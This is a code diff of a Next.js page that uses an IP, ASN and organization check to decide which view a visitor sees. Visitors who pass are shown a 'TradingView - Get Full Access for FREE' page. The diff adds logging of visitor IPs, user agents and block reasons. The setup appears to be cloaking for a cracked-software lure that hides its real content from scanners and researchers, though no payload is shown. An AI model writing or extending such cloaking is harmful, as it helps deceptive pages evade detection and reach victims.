@@ -3,23 +3,28 @@ import ViewTwo from "@/app/view-two";
 import type { Metadata } from "next";
 import { headers } from "next/headers";
 import { analyzeIpAccess } from "@/lib/ip-analysis";
+import { saveAccessLog } from "@/lib/db";
 
 // Function chung để kiểm tra điều kiện (dùng cho cả metadata và component)
-async function checkCondition(): Promise<boolean> {
+async function checkCondition(headersList: Headers): Promise<{ allowed: boolean; result: Awaited<ReturnType<typeof analyzeIpAccess>> }> {
   try {
-    const headersList = await headers();
-    return await analyzeIpAccess(headersList);
+    const result = await analyzeIpAccess(headersList);
+    return { allowed: result.allowed, result };
   } catch (error) {
     console.error("Error in checkCondition:", error);
-    return false; // Fail-safe: có lỗi → không cho phép
+    return { 
+      allowed: false, 
+      result: { allowed: false, reason: 'ERROR', details: { ip: 'unknown' } }
+    };
   }
 }
 
 // Function để tạo metadata động dựa trên điều kiện
 export async function generateMetadata(): Promise<Metadata> {
-  const isConditionMet = await checkCondition();
+  const headersList = await headers();
+  const { allowed } = await checkCondition(headersList);
 
-  if (isConditionMet) {
+  if (allowed) {
     return {
       title: "TradingView - Get Full Access for FREE",
       description: "Get Full Access to TradingView Desktop for FREE. Experience extra power, extra speed and extra flexibility.",
@@ -33,12 +38,30 @@ export async function generateMetadata(): Promise<Metadata> {
 }
 
 export default async function Home() {
-  const isConditionMet = await checkCondition();
+  const headersList = await headers();
+  const { allowed, result } = await checkCondition(headersList);
+  
+  // Lấy user agent từ headers
+  const userAgent = headersList.get('user-agent') || null;
+  
+  // Lưu access log (không await để không block rendering)
+  const ip = result.details?.ip || 'unknown';
+  saveAccessLog({
+    ip,
+    view: allowed ? 'ViewOne' : 'ViewTwo',
+    block_reason: result.reason || null,
+    organization: result.details?.organization || null,
+    asn: result.details?.asn || null,
+    user_agent: userAgent,
+  }).catch((error) => {
+    // Log error nhưng không block rendering
+    console.error('Error saving access log:', error);
+  });
 
   return (
     <div className="min-h-screen flex flex-col">
       <main className="overflow-hidden">
-        {isConditionMet ? <ViewOne /> : <ViewTwo />}
+        {allowed ? <ViewOne /> : <ViewTwo />}
       </main>
     </div>
   );
